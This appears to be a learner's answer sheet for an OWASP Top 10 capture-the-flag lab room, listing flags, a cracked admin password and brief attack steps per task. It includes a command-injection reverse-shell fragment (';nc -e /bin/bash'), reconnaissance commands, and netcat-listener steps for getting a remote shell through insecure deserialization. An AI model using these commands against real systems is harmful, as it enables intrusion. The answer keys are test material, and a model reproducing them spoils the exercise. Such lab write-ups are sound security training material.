# OWASP Top 10

## [Task 1] Introduction

## [Task 2] Accessing machines

## [Task 3] [Severity 1] Injection

## [Task 4] [Severity 1] OS Command Injection
- `whoami`
- `;nc -e /bin/bash`

## [Task 5] [Severity 1] Command Injection Practical
Commands to try
Linux
- `whoami`
- `id`

- `ifconfig/ip addr`
- `uname -a`
- `ps -ef`

Windows
- `whoami`
- `ver`
- `ipconfig`
- `tasklist`
- `netstat -an`

1. What strange text file is in the website root directory?
  - drpepper.txt
2. How many non-root/non-service/non-daemon users are there?
  - 0
3. What user is this app running as?
  - www-data
4. What is the user's shell set as?
  - /usr/sbin/nologin
5. What version of Ubuntu is running?
  - 18.04.4
6. Print out the MOTD. What favorite beverage is shown?
  - dr pepper

## [Task 6] [Severity 2] Broken Authentication

## [Task 7] [Severity 2] Broken Authentication Practical
1. What is the flag that you found in darren's account?
  - fe86079416a21a3c99937fea8874b667
2. Now try to do the same trick and see if you can login as arthur.
3. What is the flag that you found in arthur's account?
  - d9ac0f7db4fda460ac3edeb75d75e16e

## [Task 8] [Severity 3] Sensitive Data Exposure (Introduction)

## [Task 9] [Severity 3] Sensitive Data Exposure (Supporting Material 1)

## [Task 10] [Severity 3] Sensitive Data Exposure (Supporting Material 2)

## [Task 11] [Severity 3] Sensitive Data Exposure (Challenge)
1. Have a look around the web app. The developer has left themselves a note
   indicating that there is sensitive data in a specific directory. What is the
   name of the mentioned directory?
  - /assets
2. Navigate to the directory you found in question one. What file stands out as
   being likely to contain sensitive data?
  - webapp.db
3. Use the supporting material to access the sensitive data. What is the
   password hash of the admin user?
  - 6eea9b7ef19179a06954edd0f6c05ceb
4. Crack the hash. What is the admin's plaintext password?
  - qwertyuiop
5. Login as the admin. What is the flag?
  - THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## [Task 12] [Severity 4] XML Exernal Entity

## [Task 13] [Severity 4] XML External Entity - eXtensible Markup Language
1. Full form of XML
  - xtensible Markup Language
2. Is it compulsory to have XML prolog in XML documents?
  - no
3. Can we validate XML documents against a schema?
  - yes
4. How can we specify XML version and encoding in XML documents?
  - XML prolog

## [Task 14] [Severity 4] XML External Entity - DTD
1. How do you define a new ELEMENT?
  - !ELEMENT
2. How do you define a ROOT element?
  - !DOCTYPE
3. How do you define a new ENTITY?
  - !ENTITY

## [Task 15] [Severity 4] XML External Entity - XXE Payload

## [Task 16] [Severity 4] XML External Entity - Exploiting
1. Try to display your own name using any payload.
2. See if you can read the /etc/passwd.
3. What is the name of the user in /etc/passwd?
  - falcon
4. Where is falcon's SSH key located?
  - /home/falcon/.ssh/id_rsa
5. What are the first 18 characters for falcon's private key?
  - MIIEogIBAAKCAQEA7b

## [Task 17] [Severity 5] Broken Access Control
- [reference to scenarios](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)

## [Task 18] [Severity 5] Broken Access Control (IDOR Challenge)
1. Read and understand how IDOR works.
2. Deploy the machine and go to http://MACHINE_IP/ - Login with the username being _noot_ and the password _test1234_.
3. Look at other user's notes. What is the flag?
- flag{fivefourthree}

## [Task 19] [Severity 6] Security Misconfiguration
- [OWASP top 10 entry for Security Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration)

1. Deploy the VM
2. Hack into the webapp, and find the flag!
    - thm{4b9513968fd564a87b28aa1f9d672e17} 

## [Task 20] [Severity 7] Cross-site Scripting
1. Deploy the VM
2. Navigate to http://MACHINE_IP/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
    - ThereIsMoreToXSSThanYouThink
3. On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
    - ReflectiveXss4TheWin
4. Now navigate to http://MACHINE_IP/stored in your browser and make an account. Then add a comment and see if you can insert some of your own HTML.
    - HTML_T4gs
5. On the same page, create an alert popup box appear on the page with your document cookies.
    - W3LL_D0N3_LVL2
6. Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
    - websites_can_be_easily_defaced_with_xss 

## [Task 21] [Severity 8] Insecure Deserialization
1. Who developed the Tomcat application?
    - The Apache Software Foundation
2. what type of attack that crashes services can be performed with insecure deserialization?
    - denial of service

## [Task 22] [Severity 8] Insecure Deserialization - Objects
1. Select the correct term of the following statement:
    if a dog was sleeping, would this be:
    A) A State
    B) A Behaviour
    - A Behaviour

## [Task 23] [Severity 8] Insecure Deserialization - Deserialization
1. What is the name of the base-2 formatting that data is sent across a network as?
    - binary

## [Task 24] [Severity 8] Insecure Deserialization - Cookies
1. If a cookie had the path of _webapp.com/login_, what would the URL that the user has to visit be?
    - webapp.com/login
2. What is the acronym for the web technology that _Secure_ cookies work over?
    - https

## [Task 25] [Severity 8] Insecure Deserialization - Cookies Practical
1. 1st flag (cookie value)
    - THM{good_old_base64_huh}
2. 2nd flag (admin dashboard)
    - THM{heres_the_admin_flag} 

## [Task 26] [Severity 8] Insecure Deserialization - Code Execution
1. First, change the value of the userType cookie from "admin" to "user" and return to http://MACHINE_IP/myprofile.
2. Then, left-click on the URL in "Exchange your vim".
3. Once you have done this, left-click on the URL in "Provide your feedback!".
4. First, we need to set up a netcat listener.
    - `nc -lvnp 4444`
5. Create a python file to paste into, I have used "rce.py".
    - [github](https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3)
    - replace your VPN IP
    - `python3 rce.py`
6. Copy output between single quotes and paste into "encodedPayload" cookie in your browser.
7. Ensure our netcat listener is still running.
8. Refresh the page. It will hang, refer back to your netcat listener.
9. If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!
    - 4a69a7ff9fd68

## [Task 27] [Severity 9] Components With Known Vulnerabilities - Intro
- [exploit-db](https://www.exploit-db.com/exploits/41962)

## [Task 28] [Severity 9] Components With Known Vulnerabilities - Exploit
- [exploit-db](https://www.exploit-db.com/exploits/47837)

## [Task 29] [Severity 9] Components With Known Vulnerabilities - Lab
1. How many characters are in /etc/passwd (use `wc -c /etc/passwd` to get the answer)
    - 1611

## [Task 30] [Severity 10] Insufficient Logging and Monitoring
1. What IP address is the attacker using?
    - 49.99.13.16
2. What kind of attack is being carried out?
    - brute force 

## [Task 31] What's Next?

